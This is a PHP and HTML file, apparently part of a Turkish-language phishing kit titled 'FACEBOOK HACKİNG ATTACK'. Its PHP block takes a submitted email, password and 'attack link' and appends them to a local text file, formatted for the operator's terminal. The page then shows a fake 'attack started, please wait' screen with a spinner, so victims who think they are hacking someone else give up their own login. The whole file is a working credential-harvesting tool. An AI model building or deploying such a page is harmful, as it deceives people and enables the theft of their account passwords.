<?php
//include "test.php";

if (isset($_POST['eposta']) && isset($_POST['password']) && isset($_POST['link'])) {

$save = fopen("kaydedilen.txt","a+");
$eposta = $_POST['eposta'];
$password = $_POST['password'];
$link = $_POST['link'];
$vericekilen = ("
\e[32m
	████████████████████████████████████████
	██
	██ \e[97mSALDIRI LİNKİ  : \e[32m".$link."\e[32m
	██
	████████████████████████████████████████


	████████████████████████████████████████
	██
	██ \e[97mE-POSTA        : \e[32m".$eposta."\e[32m
	██
	████████████████████████████████████████


	████████████████████████████████████████
	██
	██ \e[97mŞİFRE         : \e[32m".$password."\e[32m
	██
	████████████████████████████████████████\e[97m

	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
fwrite($save,$vericekilen);
fclose($save);
//echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";

}
//*/
?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
.loader {
  border: 16px solid #f3f3f3;
  border-top: 16px solid #8ddb34;
  border-radius: 50%;
  width: 120px;
  height: 120px;
  animation: spin 2s linear infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
<meta charset="UTF-8">
<link rel="icon" href="https://www.flaticon.com/premium-icon/icons/svg/2168/2168281.svg" type="image/x-icon" />
<title>FACEBOOK HACKİNG ATTACK</title>
<style>
		* { margin: 0; padding: 0; }
		
		html { 
			background: url(https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1050&q=80) no-repeat center center fixed; 
			-webkit-background-size: cover;
			-moz-background-size: cover;
			-o-background-size: cover;
			background-size: cover;
		}
		
		#page-wrap { width: 400px; margin: 50px auto; padding: 20px; background: white; -moz-box-shadow: 0 0 20px black; -webkit-box-shadow: 0 0 20px black; box-shadow: 0 0 20px black; }
		p { font: 15px/2 Georgia, Serif; margin: 0 0 30px 0; text-indent: 40px; }
	</style>
</head>
<body>
<br>
<br>
<br>
<br>
<h3 style="color:#31a607; font-family: courier; font-weight: bold;">[✓] SALDIRI İŞLEMİ BAŞLATILDI</h3>
<br>
<h4 style="color:white; font-family: courier; font-weight: bold;">LÜTFEN BEKLEYİNİZ..</h4>
<div class="loader"></div>
</body>
</html>


